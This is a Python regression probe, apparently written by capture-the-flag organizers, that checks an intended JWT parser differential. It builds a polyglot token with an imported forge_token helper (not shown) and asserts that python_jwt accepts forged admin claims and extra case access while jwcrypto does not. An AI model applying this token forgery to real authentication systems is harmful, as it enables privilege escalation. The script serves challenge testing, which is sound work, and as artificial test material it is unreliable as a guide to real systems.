#!/usr/bin/env python3
"""Organizer-only regression probe for the intended parser differential."""

import json
from datetime import timedelta
from jwcrypto import jwk
from jwcrypto.jws import JWS
import python_jwt

from forge_token import build_polyglot

ALG = "PS256"
ORIGINAL = {
    "sub": "INV-2047",
    "role": "investigator",
    "clearance": 2,
    "case_access": ["CASE-184", "CASE-920", "CASE-314"],
    "iss": "acme-identity-gateway",
    "aud": "acme-investigation-portal",
    "session_version": 4,
}


def auth_parse(token, public_key):
    jws = JWS()
    jws.allowed_algs = [ALG]
    jws.deserialize(token, public_key)
    return json.loads(jws.payload.decode())


def main():
    key = jwk.JWK.generate(kty="RSA", size=2048)
    token = python_jwt.generate_jwt(ORIGINAL, key, ALG, timedelta(minutes=10))
    polyglot = build_polyglot(token)

    normal_a = auth_parse(token, key)
    normal_b = python_jwt.verify_jwt(token, key, [ALG])[1]
    assert normal_a["role"] == "investigator"
    assert normal_b["role"] == "investigator"

    forged_a = auth_parse(polyglot, key)
    forged_b = python_jwt.verify_jwt(polyglot, key, [ALG])[1]

    assert forged_a["role"] == "investigator", forged_a
    assert forged_b["role"] == "admin", forged_b
    assert forged_b["clearance"] == 4
    for case_id in ("CASE-7319", "CASE-4412", "CASE-5827"):
        assert case_id in forged_b["case_access"], forged_b

    print("NORMAL TOKEN")
    print("  jwcrypto   ->", normal_a)
    print("  python-jwt ->", normal_b)
    print("\nPOLYGLOT")
    print("  jwcrypto   ->", forged_a)
    print("  python-jwt ->", forged_b)
    print("\nDIFFERENTIAL CONFIRMED")


if __name__ == "__main__":
    main()
